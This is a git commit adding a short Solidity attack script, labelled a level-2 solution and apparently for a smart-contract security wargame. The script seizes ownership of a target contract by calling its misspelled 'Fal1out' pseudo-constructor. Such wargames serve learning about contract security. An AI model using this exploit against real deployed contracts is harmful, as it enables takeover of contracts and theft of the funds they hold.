5db30679b0707ca65f3396812f0939991ea482cd
Claudia <claudiabarcelovaldes40@gmail.com>
2023-12-23 14:43:38 +0100

    feat: lvl2 solution

---
+++ script/LevelAttacks/02FalloutAttk.sol
@@ -0,0 +1,20 @@
+// SPDX-License-Identifier: UNLICENSED
+
+pragma solidity ^0.8.19;
+
+import {Broadcasted} from "./Broadcasted.sol";
+
+contract FalloutAttk is Broadcasted {
+    function attack(address payable falloutCtr) public payable override {
+        // call erroneous Fal1out function
+        IFallout(falloutCtr).Fal1out();
+    }
+}
+
+interface IFallout {
+    function Fal1out() external payable;
+
+    function owner() external view returns (address);
+
+    // ! there is a typo in the contract "constructor"
+}
